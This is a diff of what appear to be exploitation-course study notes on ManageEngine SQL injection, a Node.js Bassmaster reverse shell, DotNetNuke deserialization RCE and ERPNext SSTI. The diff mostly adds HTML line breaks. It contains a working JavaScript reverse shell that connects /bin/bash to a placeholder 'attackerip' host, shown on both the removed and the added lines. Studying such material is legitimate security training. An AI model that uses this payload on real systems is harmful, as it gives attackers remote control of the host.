@@ -104,25 +104,25 @@ Module : ManageEngine Application Manager AMUserResourcesSyncServlet SQL(Postgre
         CREATE OR REPLACE FUNCTION test(text) RETURNS void AS 'FILENAME', 'test' LANGUAGE 'C' STRICT;
         
 Module : The Bassmaster Plugin (Nodejs) : 
-1. JavaScript reverse shell
-     var net = require("net"), sh = require("child_process").exec("/bin/bash");
-     var client = new net.Socket();
-     client.connect(53, "attackerip",
-     function(){client.pipe(sh.stdin);sh.stdout.pipe(client);
-     sh.stderr.pipe(client);});
+1. JavaScript reverse shell<br>
+     var net = require("net"), sh = require("child_process").exec("/bin/bash");<br>
+     var client = new net.Socket();<br>
+     client.connect(53, "attackerip",<br>
+     function(){client.pipe(sh.stdin);sh.stdout.pipe(client);<br>
+     sh.stderr.pipe(client);});<br>
 
-Module : DotNetNuke Cookie Deserialization RCE
-1. XmlSerializer Limitations
-        XmlSerializer is only able to serialize public properties and fields of an object.
-2. For better debugging experirence modify the debugging dll in dnSpy tool
+Module : DotNetNuke Cookie Deserialization RCE<br>
+1. XmlSerializer Limitations<br>
+        XmlSerializer is only able to serialize public properties and fields of an object.<br>
+2. For better debugging experirence modify the debugging dll in dnSpy tool<br>
           [assembly: Debuggable(DebuggableAttribute.DebuggingModes.Default | DebuggableAttribute.DebuggingModes.DisableOptimizations |
            DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints | DebuggableAttribute.DebuggingModes.EnableEditAndContinue)]
-3. XML Serialization & Deserialization method
-    XmlSerializer.serialize() and XmlSerializer.deserialize(reader)
-4. Java Serialization & Deserialization method
-    Deserialization : inputObjectStream.readObject() and Serialization: outputObjectStream.writeObject()
+3. XML Serialization & Deserialization method<br>
+    XmlSerializer.serialize() and XmlSerializer.deserialize(reader)<br>
+4. Java Serialization & Deserialization method<br>
+    Deserialization : inputObjectStream.readObject() and Serialization: outputObjectStream.writeObject()<br>
     
-Module : ERPNext Authentication Bypass and Server Side Template Injection :
-1. Run SMTP Server on Kali 
-    sudo python3 -m smtpd -n -c DebuggingServer 0.0.0.0:25
+Module : ERPNext Authentication Bypass and Server Side Template Injection :<br>
+1. Run SMTP Server on Kali <br>
+    sudo python3 -m smtpd -n -c DebuggingServer 0.0.0.0:25<br>
     
